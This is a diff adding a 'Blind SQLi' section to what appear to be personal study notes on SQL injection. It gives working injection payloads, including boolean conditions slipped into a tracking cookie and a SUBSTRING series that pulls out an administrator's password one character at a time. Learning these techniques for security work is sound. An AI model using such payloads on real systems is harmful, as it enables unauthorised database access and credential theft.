@@ -3,7 +3,8 @@
 1. [SQLi](#sqli)
 2. [SQLi Union](#sqli-union)
 3. [Examining Database](#examining-database)
-4. [SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+4. [Blind SQLi](#blind-sqli)
+5. [SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 * SQLi - web security vulnerability; allows attacker to interfere with queries made by app to database.
 
@@ -144,3 +145,41 @@
   #list columns
   SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
   ```
+
+## Blind SQLi
+
+* In blind vulnerabilities, application does not return results of SQL query or error details; with blind SQLi vulnerabilities, ```UNION attacks``` are not effective.
+
+* Triggering conditional responses:
+
+  * Suppose the app uses tracking cookies to gather usage analytics; requests to app would include a cookie header with 'TrackingId' field, which is used to find if it is a known user:
+
+    ```sql
+    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+    ```
+
+  * This query is vulnerable, but query results are not returned to user; we have to trigger responses conditionally:
+
+    ```sql
+    ..dummyVal' AND '1'='1
+    #accepts user
+
+    ..dummyVal' AND '1'='2
+    #does not accept user
+    ```
+
+  * Assume there is a table ```Users``` with columns ```Username``` and ```Password```, with user ```Administrator``` - we can determine password using series of inputs (one char at a time):
+
+    ```sql
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+    #this accepts user, indicating first char of password is greater than 'm'
+
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+    #this does not accept user, indicating first char of password is not greater than 't'
+
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+    #accepts user, meaning first char of password is 's'
+
+    #continue this series
+    #for Oracle db, use SUBSTR function
+    ```
